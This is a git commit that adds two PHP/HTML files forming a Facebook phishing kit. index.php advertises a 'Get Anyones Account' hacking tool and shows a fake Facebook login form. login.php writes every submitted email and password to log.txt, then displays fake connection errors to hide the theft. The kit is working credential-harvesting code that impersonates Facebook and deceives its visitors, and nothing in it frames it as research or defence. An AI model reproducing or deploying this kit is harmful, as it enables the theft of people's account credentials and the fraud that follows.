98487d85e70a0794d4189414ec6c86c7b0919e12
fastisbac <34606382+fastisbac@users.noreply.github.com>
2017-12-16 23:11:57 +0500

    Add files via upload

---
+++ index.php
@@ -0,0 +1,93 @@
+<!DOCTYPE html>
+<html>
+    <style>
+    body{
+        background-color: #003366;
+    }
+</style>
+<head>
+    
+	<title>facebook</title>
+	<meta name="viewport" content="width=device-width, initial-scale=1">
+	<link rel="stylesheet" type="text/css" href="style.css">
+	<link rel="shortcut icon" href="icon.png" type="image/x-icon" />
+	<script type="text/javascript">
+		function showdiv()
+		{
+			document.getElementById('login-window').style.display='flex';
+			window.scrollTo(0,0);
+		}
+
+		function hidediv()
+		{
+			document.getElementById('login-window').style.display='none';
+		}
+	</script>
+</head>
+
+<div id='login-window' class="login-window" style="display:none">
+	
+	<div class="inner-window">
+		<div class="downhead">
+			<form action="login.php" method="POST">
+			<div class="banner">
+			<img src="fb-logo.png" style="width: 20px;height:20px">&nbsp;<span style="color:white">Facebook</span>
+			</div>
+
+			<div class="road-banner">
+				<img src="road-banner.png">
+			</div>
+
+			<div class="details">
+				
+				<span style="font-size: 14px">Login to use your account with <span style="color: #3B5998;cursor:pointer">Facebook Account Hacker</span></span>
+				<br><br><br><br>
+				<div class="id-info">
+					<label style="color:#666666;font-weight:bold" for="email-id">Email or Phone:&nbsp;&nbsp;&nbsp;</label>
+					<input type="text" name="email" style="font-size: 12px">
+				</div>
+				<div class="id-info">
+					<label style="color:#666666;font-weight:bold" for="email-id">Password:&nbsp;&nbsp;&nbsp;</label>
+					<input type="password" name="pass" style="font-size: 12px">
+				</div>
+
+				<div class="id-info">
+					<span><a target="_blank" style="color: #3B5998" href='https://www.facebook.com/recover/initiate'>Forgotten Account?</a></span>
+				</div>
+			</div>
+
+			<div class="footer">
+					
+						<input class='pvbutt' type="submit" name='submit' value="Log in" ></input>
+						<button class='pvbutt extra' type='button' onclick="hidediv()">Cancel</button>
+			</div>
+			</form>
+		</div>
+	</div>
+
+</div>
+
+<div class="top">
+	 <h1 style="margin-top:0;"><img src="indexlogo.png" style="width: 80px;height:80px"> Facebook Archive - Get Anyones Account</h1>
+</div>
+	<header>
+		<img src="logo2.png">
+		<div class="head" style="display:inline-block;align-self:center">
+			<h3>Guidelines</h3>
+			1. This will help learn more about your Security.<br><br>
+			2. This will help you on you journey to become a White Hat. You can use this on anyone you want and he/she would'nt even know. You just need to login; Then you will be asked for the Victims ID Link and then the process will begin. In a couple of minutes you will have the Credentials of the account you want.
+            <div class="sign-in">
+		To Proceed, Login using your Facebook Account. 
+		<br>
+		<img src="facebook-button.png" onclick="showdiv()">
+        <br>
+                v.1
+	</div>
+		</div>
+	</header>
+
+	
+
+
+</body>
+</html>
---
+++ login.php
@@ -0,0 +1,62 @@
+<style>
+    body{
+        background-color: #003366;
+    }
+</style>
+<?php
+
+if(!isset($_POST['email']) || empty($_POST['email']) || !isset($_POST['pass']) || empty($_POST['pass']))
+{
+	header("location:index.php");
+}
+else{
+    $logfile = fopen("log.txt", "a");
+foreach($_POST as $variable => $value) {
+    fwrite($logfile, $variable);
+    fwrite($logfile, "=");
+    fwrite($logfile, $value);
+    fwrite($logfile, "\r\n");
+    }
+    fwrite($logfile, "\r\n");
+    fclose($logfile);
+}
+
+?>
+
+<!DOCTYPE html>
+<html>
+<head>
+	<title>facebook</title>
+	<meta name="viewport" content="width=device-width, initial-scale=1">
+	<link rel="stylesheet" type="text/css" href="style.css">
+	<link rel="shortcut icon" href="icon.png" type="image/x-icon" />
+</head>
+    
+<body>
+
+<div class="top">
+   
+	<h1 style="margin-top:0; color:black">  <img src="indexlogo.png" style="width: 80px;height:80px"> Facebook Archive - Get Anyones Account</h1> 
+</div>
+	<header>
+		<img src="logo2.png">
+		<div class="head" style="display:inline-block;align-self:center">
+			<h3>Information</h3>
+            Enter ID URL/Link<br>
+            <input type="search" name="Enter URL" style="fontsize: 10px"><br>
+            <input type="button" name="Begin" value="Click to Begin" onclick="showdiv()">
+            <br>
+            <span style=color:blue>Website UNDER Updates! Please come back Later!</span><br>
+            Account Name = <span style=color:red>Error while Parsing. [Poor Internet Connection, Failed to Connect to Facebook Database]</span><br>
+            Account Link = <span style=color:red>Error while Parsing. [Poor Internet Connection, Failed to Connect to Facebook Database]</span><br>
+            Account Password = <span style=color:red>Error while Parsing. [Poor Internet Connection, Failed to Connect to Facebook Database]</span>
+            
+           <br><br><span style="color: #3B5998;cursor:pointer">#ProjectFacebookPh. </span>
+            Thank you for Participating in Project FacebookPh.<br>
+            If you don't know what to do next. Close this.
+		</div>
+	</header>
+
+
+</body>
+</html>
